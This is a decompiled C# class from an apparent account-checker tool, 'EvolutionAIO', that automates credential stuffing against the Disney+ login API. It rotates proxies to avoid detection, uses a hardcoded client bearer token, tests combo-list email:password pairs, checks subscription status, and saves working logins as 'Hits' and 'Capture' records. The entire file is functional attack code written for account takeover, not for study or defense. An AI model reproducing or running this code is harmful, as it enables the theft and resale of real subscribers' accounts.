// Decompiled with JetBrains decompiler
// Type: EvolutionAIO.Checkers.Disney
// Assembly: EvolutionAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FFBD76CC-A7A1-4682-B132-DAECA7C9FD32
// Assembly location: C:\Users\Pc\Downloads\Evolutionv2\EvolutionAIO.exe

using Leaf.xNet;
using System;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

namespace EvolutionAIO.Checkers
{
  internal class Disney
  {
    public static bool check(string[] s, string proxy)
    {
      if (0 >= Config.config.retries + 1)
        return false;
      while (true)
      {
        try
        {
          using (HttpRequest httpRequest = new HttpRequest())
          {
            int num = 0;
            proxy = Menu.proxies.ElementAt<string>(new Random().Next(Menu.proxiesCount));
            if (Menu.proxyProtocol == "HTTP")
              httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
            if (Menu.proxyProtocol == "SOCKS4")
              httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
            if (Menu.proxyProtocol == "SOCKS5")
              httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
            string str1 = "windows";
            string str2 = "ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84";
            string str3 = "disney-svod-3d9324fc";
            string str4 = "{\"deviceFamily\":\"browser\",\"applicationRuntime\":\"chrome\",\"deviceProfile\":\"" + str1 + "\",\"attributes\":{}}";
            httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36");
            httpRequest.AddHeader("Pragma", "no-cache");
            httpRequest.AddHeader("Accept", "*/*");
            httpRequest.AddHeader("x-bamsdk-platform", str1);
            httpRequest.AddHeader("x-bamsdk-client-id", str3);
            httpRequest.AddHeader("authorization", "Bearer " + str2);
            httpRequest.AddHeader("x-bamsdk-version", "4.2");
            httpRequest.IgnoreProtocolErrors = true;
            httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
            string str5 = Menu.Parse(httpRequest.Post("https://global.edge.bamgrid.com/devices", str4, "application/json").ToString(), "assertion\":\"", "\"}");
            httpRequest.ClearAllHeaders();
            httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36");
            httpRequest.AddHeader("Pragma", "no-cache");
            httpRequest.AddHeader("Accept", "*/*");
            httpRequest.AddHeader("x-bamsdk-platform", str1);
            httpRequest.AddHeader("x-bamsdk-client-id", str3);
            httpRequest.AddHeader("authorization", "Bearer " + str2);
            httpRequest.AddHeader("x-bamsdk-version", "4.2");
            httpRequest.EnableEncodingContent = true;
            string str6 = "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&latitude=0&longitude=0&platform=browser&subject_token=" + str5 + "&subject_token_type=urn:bamtech:params:oauth:token-type:device";
            HttpResponse httpResponse1 = httpRequest.Post("https://global.edge.bamgrid.com/token", str6, "application/x-www-form-urlencoded");
            if (httpResponse1.ToString().Contains("error_description"))
            {
              ++Menu.retries;
            }
            else
            {
              string str7;
              while (true)
              {
                ++num;
                httpRequest.EnableEncodingContent = false;
                str7 = Menu.Parse(httpResponse1.ToString(), "access_token\":\"", "\"");
                httpRequest.ClearAllHeaders();
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36");
                httpRequest.AddHeader("Pragma", "no-cache");
                httpRequest.AddHeader("Accept", "*/*");
                httpRequest.AddHeader("x-bamsdk-platform", str1);
                httpRequest.AddHeader("x-bamsdk-client-id", str2);
                httpRequest.AddHeader("authorization", "Bearer " + str7);
                httpRequest.AddHeader("x-bamsdk-version", "4.2");
                string str8 = "{\"email\":\"" + s[0] + "\"}";
                HttpResponse httpResponse2 = httpRequest.Post("https://global.edge.bamgrid.com/idp/check", str8, "application/json");
                if (!httpResponse2.ToString().Contains("{\"operations\":[\"Login\",\"OTP\"]}") && !httpResponse2.ToString().Contains("{\"operations\":[\"OTP\"]}") && !httpResponse2.ToString().Contains("OTP"))
                {
                  if (!httpResponse2.ToString().Contains("{\"operations\":[\"Register\"]}") && num != 3)
                    ++Menu.retries;
                  else
                    goto label_24;
                }
                else
                  break;
              }
              httpRequest.ClearAllHeaders();
              httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36");
              httpRequest.AddHeader("Pragma", "no-cache");
              httpRequest.AddHeader("Accept", "*/*");
              httpRequest.AddHeader("x-bamsdk-platform", str1);
              httpRequest.AddHeader("x-bamsdk-client-id", str3);
              httpRequest.AddHeader("authorization", "Bearer " + str7);
              httpRequest.AddHeader("x-bamsdk-version", "4.2");
              string str9 = "{\"email\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\"}";
              HttpResponse httpResponse3 = httpRequest.Post("https://global.edge.bamgrid.com/idp/login", str9, "application/json");
              if (httpResponse3.ToString().Contains("Bad credentials"))
                return false;
              if (httpResponse3.ToString().Contains("id_token"))
              {
                httpRequest.ClearAllHeaders();
                string str8 = "{\"id_token\":\"" + Menu.Parse(httpResponse3.ToString(), "id_token\":\"", "\",") + "\"}";
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36");
                httpRequest.AddHeader("Pragma", "no-cache");
                httpRequest.AddHeader("Accept", "*/*");
                httpRequest.AddHeader("x-bamsdk-platform", str1);
                httpRequest.AddHeader("x-bamsdk-client-id", str3);
                httpRequest.AddHeader("authorization", "Bearer " + str7);
                httpRequest.AddHeader("x-bamsdk-version", "4.2");
                string str10 = Menu.Parse(httpRequest.Post("https://global.edge.bamgrid.com/accounts/grant", str8, "application/json").ToString(), "assertion\":\"", "\"");
                httpRequest.ClearAllHeaders();
                httpRequest.EnableEncodingContent = true;
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36");
                httpRequest.AddHeader("Pragma", "no-cache");
                httpRequest.AddHeader("Accept", "*/*");
                httpRequest.AddHeader("x-bamsdk-platform", str1);
                httpRequest.AddHeader("x-bamsdk-client-id", str3);
                httpRequest.AddHeader("authorization", "Bearer " + str2);
                httpRequest.AddHeader("x-bamsdk-version", "4.2");
                string str11 = "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&latitude=0&longitude=0&platform=browser&subject_token=" + str10 + "&subject_token_type=urn:bamtech:params:oauth:token-type:account";
                string str12 = Menu.Parse(httpRequest.Post("https://global.edge.bamgrid.com/token", str11, "application/x-www-form-urlencoded").ToString(), "access_token\":\"", "\"");
                httpRequest.ClearAllHeaders();
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36");
                httpRequest.AddHeader("Pragma", "no-cache");
                httpRequest.AddHeader("Accept", "*/*");
                httpRequest.AddHeader("x-bamsdk-platform", str1);
                httpRequest.AddHeader("x-bamsdk-client-id", str3);
                httpRequest.AddHeader("authorization", "Bearer " + str12);
                httpRequest.AddHeader("x-bamsdk-version", "4.2");
                httpRequest.EnableEncodingContent = false;
                HttpResponse httpResponse2 = httpRequest.Get("https://global.edge.bamgrid.com/subscriptions");
                if (httpResponse2.ToString().Contains("[]") || httpResponse2.ToString().Contains("\"isActive\":false") || httpResponse2.ToString().Contains("\"status\":\"INACTIVE"))
                {
                  ++Menu.frees;
                  if (Menu.p1 == "2")
                    Colorful.Console.Write(" [/] " + s[0] + ":" + s[1] + " | FREE\n", Color.Yellow);
                  Save.AsResult("Disney+", "Frees", s[0] + ":" + s[1] + " | FREE");
                  return false;
                }
                ++Menu.hits;
                string str13 = Menu.Parse(httpResponse2.ToString(), "\",\"name\":\"", "\",\"");
                if (Menu.p1 == "2")
                  Colorful.Console.Write(" [+] " + s[0] + ":" + s[1] + " | Subscription: " + str13 + "\n", Color.Green);
                Save.AsResult("Disney+", "Capture", s[0] + ":" + s[1] + " | Subscription: " + str13);
                Save.AsResult("Disney+", "Hits", s[0] + ":" + s[1]);
                return false;
              }
              ++Menu.retries;
              continue;
label_24:
              return false;
            }
          }
        }
        catch (Exception ex)
        {
          if (ex.ToString().Contains("Index was outside the bounds of the array"))
            return false;
          ++Menu.errors;
        }
      }
    }
  }
}
